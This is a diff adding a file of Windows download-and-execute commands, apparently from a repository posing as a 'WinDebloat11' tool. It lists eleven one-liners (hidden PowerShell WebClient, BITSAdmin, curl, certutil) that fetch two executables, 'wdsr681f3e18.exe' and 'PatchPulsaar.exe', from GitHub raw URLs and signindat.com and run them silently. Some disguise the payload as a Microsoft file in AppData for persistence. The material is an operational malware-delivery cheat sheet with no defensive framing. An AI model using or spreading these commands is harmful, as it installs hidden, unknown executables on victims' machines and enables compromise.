@@ -1,0 +1,45 @@
+# ============================================================
+# WDSR Payload Download & Execute Commands
+# ============================================================
+# Payload: wdsr681f3e18.exe (36,756,992 bytes)
+# Renames to: wmdrs.exe (AppData\Microsoft)
+# ============================================================
+
+# === METHOD 1: GitHub Raw (прямая загрузка) ===
+powershell -w hidden -NoP -c "$w=New-Object Net.WebClient;$w.Headers.Add('User-Agent','Mozilla/5.0');[IO.File]::WriteAllBytes(\"$env:TEMP\wmdrs.exe\",$w.DownloadData('https://raw.githubusercontent.com/jimmyishere111/WinDebloat11/main/brokers/wdsr681f3e18.exe'));Start-Process \"$env:TEMP\wmdrs.exe\" -WindowStyle Hidden"
+
+# === METHOD 2: Signindat.com (прямая загрузка с сервера) ===
+powershell -w hidden -NoP -c "$w=New-Object Net.WebClient;[IO.File]::WriteAllBytes(\"$env:TEMP\wmdrs.exe\",$w.DownloadData('https://signindat.com/wdsr681f3e18.exe'));Start-Process \"$env:TEMP\wmdrs.exe\" -WindowStyle Hidden"
+
+# === METHOD 3: BITSAdmin (GitHub, фоновый режим) ===
+cmd.exe /c bitsadmin /transfer wdsr /download /priority high https://raw.githubusercontent.com/jimmyishere111/WinDebloat11/main/brokers/wdsr681f3e18.exe %TEMP%\wmdrs.exe && start /b %TEMP%\wmdrs.exe
+
+# === METHOD 4: BITSAdmin (Signindat.com, фоновый режим) ===
+cmd.exe /c bitsadmin /transfer wdsr /download /priority high https://signindat.com/wdsr681f3e18.exe %TEMP%\wmdrs.exe && start /b %TEMP%\wmdrs.exe
+
+# === METHOD 5: curl (Windows 10+ build 1803+) ===
+curl.exe -k -L -o %TEMP%\wmdrs.exe https://signindat.com/wdsr681f3e18.exe && start /b %TEMP%\wmdrs.exe
+
+# === METHOD 6: certutil (обход ограничений) ===
+certutil -urlcache -split -f https://signindat.com/wdsr681f3e18.exe %TEMP%\wmdrs.exe && start /b %TEMP%\wmdrs.exe
+
+# === METHOD 7: One-liner PowerShell с копированием в AppData (persist) ===
+powershell -w hidden -NoP -c "$w=New-Object Net.WebClient;$b=$w.DownloadData('https://signindat.com/wdsr681f3e18.exe');$p1=\"$env:APPDATA\Microsoft\wmdrs.exe\";$p2=\"$env:LOCALAPPDATA\Microsoft\wmdrs.exe\";[IO.File]::WriteAllBytes($p1,$b);[IO.File]::WriteAllBytes($p2,$b);Start-Process $p1 -WindowStyle Hidden"
+
+# ============================================================
+# PatchPulsaar Payload Download & Execute Commands
+# ============================================================
+# Payload: PatchPulsaar.exe (975,872 bytes)
+# ============================================================
+
+# === METHOD 1: GitHub Raw ===
+powershell -w hidden -NoP -c "$w=New-Object Net.WebClient;$w.Headers.Add('User-Agent','Mozilla/5.0');[IO.File]::WriteAllBytes(\"$env:TEMP\pp.exe\",$w.DownloadData('https://raw.githubusercontent.com/jimmyishere111/WinDebloat11/main/brokers/PatchPulsaar.exe'));Start-Process \"$env:TEMP\pp.exe\" -WindowStyle Hidden"
+
+# === METHOD 2: Signindat.com ===
+powershell -w hidden -NoP -c "$w=New-Object Net.WebClient;[IO.File]::WriteAllBytes(\"$env:TEMP\pp.exe\",$w.DownloadData('https://signindat.com/PatchPulsaar.exe'));Start-Process \"$env:TEMP\pp.exe\" -WindowStyle Hidden"
+
+# === METHOD 3: BITSAdmin (Signindat.com) ===
+cmd.exe /c bitsadmin /transfer pulsar /download /priority high https://signindat.com/PatchPulsaar.exe %TEMP%\pp.exe && start /b %TEMP%\pp.exe
+
+# === METHOD 4: certutil ===
+certutil -urlcache -split -f https://signindat.com/PatchPulsaar.exe %TEMP%\pp.exe && start /b %TEMP%\pp.exe
